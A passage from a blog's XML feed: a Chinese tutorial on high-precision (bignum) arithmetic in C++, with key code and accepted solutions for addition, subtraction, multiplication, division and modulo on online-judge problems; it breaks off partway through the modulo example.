<p>【2】web3.js中文文档.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>【3】Solidity中文文档.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>【4】truffle文档.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>【5】开发、部署第一个DApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>【6】DApp教程：用Truffle 开发一个链上记事本.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>【7】Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>高精度运算</title>
    <url>/2021/05/06/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<blockquote>
<p>本文所探讨的均为高精度数字对高精度数字进行的操作（除特殊说明外）、尚未讨论负数的情况、数字的最低位保存在数组下标<code>0</code>处、尚未进行压位操作（除特殊说明）</p>
</blockquote>
<a id="more"></a>

<h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len3; i++)&#123;</span><br><span class="line">    ans[i] += num1[i] + num2[i];</span><br><span class="line">    <span class="comment">// 传递进位</span></span><br><span class="line">    ans[i + <span class="number">1</span>] += ans[i] / <span class="number">10</span>;</span><br><span class="line">    ans[i] %= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P1601" target="_blank" rel="noopener">洛谷1601</a></p>
<p><code>AC</code>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;, num2[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len1, len2, len3;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">2001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    len3 = len1 &gt; len2 ? len1 : len2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len3; i++)&#123;</span><br><span class="line">        ans[i] += num1[i] + num2[i];</span><br><span class="line">        <span class="comment">// 传递进位</span></span><br><span class="line">        ans[i + <span class="number">1</span>] += ans[i] / <span class="number">10</span>;</span><br><span class="line">        ans[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ans[len3] != <span class="number">0</span>)len3++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h2><p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">    ans[i] += big[i] - sml[i];</span><br><span class="line">    <span class="comment">// 产生借位</span></span><br><span class="line">    <span class="keyword">if</span> (ans[i] &lt; <span class="number">0</span>)ans[i + <span class="number">1</span>]--, ans[i] += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P2142" target="_blank" rel="noopener">洛谷2142</a></p>
<p><code>AC</code>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="comment">// 判断两个数字的大小关系</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> len1, <span class="keyword">int</span> len2, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(len1 != len2)<span class="keyword">return</span> len1 &gt; len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (num1[i] != num2[i])<span class="keyword">return</span> num1[i] &gt; num2[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> big[], <span class="keyword">int</span> len1, <span class="keyword">int</span> sml[], <span class="keyword">int</span> len2, <span class="keyword">bool</span> positive)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span> ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">        ans[i] += big[i] - sml[i];</span><br><span class="line">        <span class="keyword">if</span> (ans[i] &lt; <span class="number">0</span>)ans[i + <span class="number">1</span>]--, ans[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len1 &gt;= <span class="number">1</span> &amp;&amp; ans[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">    <span class="keyword">if</span> (len1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!positive) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1[<span class="number">10090</span>], num2[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">memset</span>(num1, <span class="number">0</span>, <span class="keyword">sizeof</span> num1);</span><br><span class="line">    <span class="built_in">memset</span>(num2, <span class="number">0</span>, <span class="keyword">sizeof</span> num2);</span><br><span class="line">    <span class="keyword">int</span> len1, len2, len3;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmp(len1, len2, num1, num2))sub(num1, len1, num2, len2, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">else</span> sub(num2, len2, num1, len1, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; j++)&#123;</span><br><span class="line">        <span class="comment">// 相当于往左偏移</span></span><br><span class="line">        ans[i + j] += num1[i] * num2[j];</span><br><span class="line">        ans[i + j + <span class="number">1</span>] += ans[i + j] / <span class="number">10</span>;</span><br><span class="line">        ans[i + j]  %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P1303" target="_blank" rel="noopener">洛谷1303</a></p>
<p><code>AC</code>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">2010</span>] = &#123;<span class="number">0</span>&#125;, num2[<span class="number">2010</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">4020</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len1, len2, len3;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">2001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++)num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; j++)&#123;</span><br><span class="line">            ans[i + j] += num1[i] * num2[j];</span><br><span class="line">            ans[i + j + <span class="number">1</span>] += ans[i + j] / <span class="number">10</span>;</span><br><span class="line">            ans[i + j]  %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    len3 = len1 + len2;</span><br><span class="line">    <span class="keyword">while</span>(ans[len3 - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; len3 &gt;= <span class="number">1</span>)len3--;</span><br><span class="line">    <span class="keyword">if</span> (len3 == <span class="number">0</span>)<span class="keyword">return</span> (<span class="built_in">printf</span>(<span class="string">"0"</span>),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h2><h3 id="高精度对高精度"><a href="#高精度对高精度" class="headerlink" title="高精度对高精度"></a>高精度对高精度</h3><p>emm，高精度除高精度的确写起来有点棘手，而且普通版本的时间复杂度达到了<code>O(n^2)</code></p>
<p>原理还是模拟小学二年级的竖式除法</p>
<p>练习题目：<a href="http://ybt.ssoier.cn:8088/problem_show.php?pid=1308" target="_blank" rel="noopener">一本通1308</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> len1, <span class="keyword">int</span> len2, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(len1 != len2)<span class="keyword">return</span> len1 - len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (num1[i] != num2[i])<span class="keyword">return</span> num1[i] - num2[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> big[], <span class="keyword">int</span> &amp;len1, <span class="keyword">int</span> sml[], <span class="keyword">int</span> len2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">        big[i] = big[i] - sml[i];</span><br><span class="line">        <span class="keyword">if</span> (big[i] &lt; <span class="number">0</span>)big[i + <span class="number">1</span>]--, big[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len1 &gt;= <span class="number">1</span> &amp;&amp; big[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">numcpy</span><span class="params">(<span class="keyword">int</span> src[], <span class="keyword">int</span> len1, <span class="keyword">int</span> dest[], <span class="keyword">int</span> &amp;len2, <span class="keyword">int</span> startIndex)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 将 除数 扩展，即除数和被除数高位对齐</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)dest[startIndex + i] = src[i];</span><br><span class="line">    len2 = len1 + startIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a / b, 结束后a[] 中是余数，ans[]是商</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len1, <span class="keyword">int</span> b[], <span class="keyword">int</span> len2, <span class="keyword">int</span> ans[], <span class="keyword">int</span> &amp;len3)</span></span>&#123;</span><br><span class="line">    <span class="comment">// temp用于扩展除数</span></span><br><span class="line">    <span class="keyword">int</span> temp[<span class="number">305</span>], tempLen;</span><br><span class="line">    len3 = len1 - len2 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span> temp);</span><br><span class="line">        numcpy(b, len2, temp, tempLen, i);</span><br><span class="line">        <span class="keyword">while</span>(cmp(len1, tempLen, a, temp) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            ans[i]++;</span><br><span class="line">            sub(a, len1, temp, tempLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> ans[], <span class="keyword">int</span> len1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(len1 &gt;= <span class="number">1</span> &amp;&amp; ans[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">    <span class="keyword">if</span> (len1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1[<span class="number">305</span>], num2[<span class="number">305</span>], ans[<span class="number">305</span>], len1, len2, len3;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">305</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span> ans);</span><br><span class="line">    div(num1, len1, num2, len2, ans, len3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans, len3);</span><br><span class="line">    <span class="built_in">print</span>(num1, len2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者使用<a href="https://zhuanlan.zhihu.com/p/26756957" target="_blank" rel="noopener"> <code>Newton Division</code>方法</a>，时间复杂度可以降到<code>O(nlog(n))</code>，emm，但是这个方法有点复杂，我不是很看得懂。</p>
<h3 id="高精度对单精度"><a href="#高精度对单精度" class="headerlink" title="高精度对单精度"></a>高精度对单精度</h3><p>这个就简单多了，原理还是一样</p>
<p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">    nowNum = nowNum * <span class="number">10</span> + (<span class="keyword">long</span> <span class="keyword">long</span>)num[i];</span><br><span class="line">    <span class="keyword">if</span> (nowNum &gt;= divNum)&#123;</span><br><span class="line">        ans[i] = nowNum / divNum;</span><br><span class="line">        nowNum = nowNum % divNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P1480" target="_blank" rel="noopener">洛谷1480</a></p>
<p><code>AC</code>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">5005</span>], len, ans[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">5005</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)num[i] = buff[len - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> divNum;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;divNum);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> nowNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        nowNum = nowNum * <span class="number">10</span> + (<span class="keyword">long</span> <span class="keyword">long</span>)num[i];</span><br><span class="line">        <span class="keyword">if</span> (nowNum &gt;= divNum)&#123;</span><br><span class="line">            ans[i] = nowNum / divNum;</span><br><span class="line">            nowNum = nowNum % divNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len &gt;= <span class="number">1</span> &amp;&amp; ans[len - <span class="number">1</span>] == <span class="number">0</span>)len--;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>)<span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"0"</span>), <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="求模"><a href="#求模" class="headerlink" title="求模"></a>求模</h2><h3 id="高精度对高精度-1"><a href="#高精度对高精度-1" class="headerlink" title="高精度对高精度"></a>高精度对高精度</h3><p>这个就没什么好讲的了，参考高精度对高精度除法即可</p>
<h3 id="高精度对单精度-1"><a href="#高精度对单精度-1" class="headerlink" title="高精度对单精度"></a>高精度对单精度</h3><p>算法的原理是根据</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(a + b) % c == (a % c + b % c) % c</span><br></pre></td></tr></table></figure>

<p>因此高精度对单精度求模等价于从高位开始进行求模，然后将结果往低位传播即可</p>
<p>练手题目：<a href="http://poj.org/problem?id=2635" target="_blank" rel="noopener">poj2635</a></p>
<p><code>AC</code>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_NUM = <span class="number">1e6</span>;</span><br><span class="line"><span class="keyword">bool</span> notDeleted[MAX_NUM];</span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">80000</span>], total;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrime</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; MAX_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!notDeleted[i])&#123;</span><br><span class="line">            prime[total++] = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i * i; j &gt; <span class="number">0</span> &amp;&amp; j &lt; MAX_NUM; j += i)notDeleted[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkModZero</span><span class="params">(<span class="keyword">int</span> num[], <span class="keyword">int</span> len, <span class="keyword">int</span> checkPrime)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mod = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="comment">// 从高位求模，往后传播</span></span><br><span class="line">        mod = (mod * <span class="number">1000</span> + num[i]) % checkPrime;</span><br><span class="line">    <span class="keyword">return</span> mod == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(<span class="keyword">int</span> num[], <span class="keyword">int</span> &amp;len, <span class="keyword">char</span> buff[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="built_in">strlen</span>(buff), hand, ten, one;</span><br><span class="line">    <span class="keyword">char</span> tem;</span><br><span class="line">    buff[<span class="built_in">size</span>] = <span class="string">'\0'</span>, buff[<span class="built_in">size</span> + <span class="number">1</span>] = <span class="string">'\0'</span>, buff[<span class="built_in">size</span> + <span class="number">2</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="built_in">size</span> &gt;&gt; <span class="number">1</span>); i++)&#123;</span><br><span class="line">        tem = buff[i];</span><br><span class="line">        buff[i] = buff[<span class="built_in">size</span> - i - <span class="number">1</span>];</span><br><span class="line">        buff[<span class="built_in">size</span> - i - <span class="number">1</span>] = tem;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; buff[len * <span class="number">3</span>] != <span class="string">'\0'</span>;len++)&#123;</span><br><span class="line">        <span class="comment">// 这里需要压位，否则会超时</span></span><br><span class="line">        num[len] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (buff[len * <span class="number">3</span> + <span class="number">2</span>] != <span class="string">'\0'</span>)num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span> + <span class="number">2</span>] - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span> (buff[len * <span class="number">3</span> + <span class="number">1</span>] != <span class="string">'\0'</span>)num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span> + <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">        num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span>] - <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getPrime();</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">int</span> l, len, num[<span 